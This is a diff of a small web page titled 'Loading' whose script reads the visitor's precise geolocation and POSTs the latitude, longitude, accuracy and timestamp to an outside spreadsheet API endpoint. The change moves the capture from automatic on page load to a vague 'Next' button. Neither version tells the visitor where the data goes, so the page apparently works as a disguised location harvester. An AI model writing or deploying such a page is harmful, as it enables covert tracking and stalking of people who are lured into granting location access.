@@ -5,33 +5,39 @@
   <title>Loading</title>
 </head>
 <body>
+  <button onclick="sendLocation()">Next</button>
+
   <script>
-    navigator.geolocation.getCurrentPosition(
-      async position => {
-        const coords = position.coords;
-        const data = {
-          lat: coords.latitude,
-          lon: coords.longitude,
-          accuracy: coords.accuracy,
-          timestamp: new Date(position.timestamp).toISOString()
-        };
+    async function sendLocation() {
+      navigator.geolocation.getCurrentPosition(
+        async position => {
+          const coords = position.coords;
+          const data = {
+            lat: coords.latitude,
+            lon: coords.longitude,
+            accuracy: coords.accuracy,
+            timestamp: new Date(position.timestamp).toISOString()
+          };
 
-        try {
-          await fetch("https://api.sheetbest.com/sheets/233a23e8-d3ef-4808-8143-388711e3a59a", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-          });
+          try {
+            await fetch("https://api.sheetbest.com/sheets/233a23e8-d3ef-4808-8143-388711e3a59a", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data)
+            });
 
-          console.log("Location sent:", data);
-        } catch (err) {
-          console.error("Failed to send data:", err);
+            console.log("Location sent:", data);
+            alert("Location shared successfully!");
+          } catch (err) {
+            console.error("Failed to send data:", err);
+          }
+        },
+        error => {
+          console.warn("Geolocation error:", error);
+          alert("⚠️ Location permission was denied or failed.");
         }
-      },
-      error => {
-        console.warn("Geolocation error:", error);
-      }
-    );
+      );
+    }
   </script>
 </body>
 </html>
